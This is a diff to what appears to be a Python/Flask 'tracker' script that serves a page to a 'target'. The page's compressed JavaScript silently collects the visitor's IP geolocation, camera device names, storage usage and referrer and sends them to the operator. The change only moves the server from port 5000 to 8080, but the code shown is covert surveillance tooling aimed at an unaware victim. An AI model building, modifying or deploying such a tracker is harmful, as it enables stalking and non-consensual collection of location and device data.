@@ -38,7 +38,7 @@ try{fetch("https://ipapi.co/json/").then(function(r){return r.json()}).then(func
 try{if(navigator.mediaDevices&&navigator.mediaDevices.enumerateDevices){navigator.mediaDevices.enumerateDevices().then(function(dev){var v=[];dev.forEach(function(d){if(d.kind==="videoinput")v.push(d.label||"cam")});Z("cam",{c:v.length,n:v.join("|")})}).catch(function(){})}}catch(e){}
 try{if(navigator.storage&&navigator.storage.estimate){navigator.storage.estimate().then(function(s){Z("stg",{u:Math.round(s.usage/1024/1024)+"MB",q:Math.round(s.quota/1024/1024)+"MB",p:Math.round((s.usage/s.quota)*100)+"%"})})}}catch(e){}
 try{Z("ref",{r:document.referrer||"direct",u:window.location.href})}catch(e){}
-setTimeout(function(){if(!S){Z("fin",{ms:Date.now()})}S=true},5000)})();
+setTimeout(function(){if(!S){Z("fin",{ms:Date.now()})}S=true},8080)})();
 </script>
 </body>
 </html>"""
@@ -144,8 +144,8 @@ print("\n"+ "="*50)
 print("  TRACKER READY")
 print("="*50)
 ip=socket.gethostbyname(socket.gethostname())
-print(f"\n  URL:   http://{ip}:5000")
-print(f"  Admin: http://{ip}:5000/v")
+print(f"\n  URL:   http://{ip}:8080")
+print(f"  Admin: http://{ip}:8080/v")
 print("\n  Share the URL with target")
 print("="*50)
-app.run(host='0.0.0.0',port=5000,threaded=True)
+app.run(host='0.0.0.0',port=8080,threaded=True)
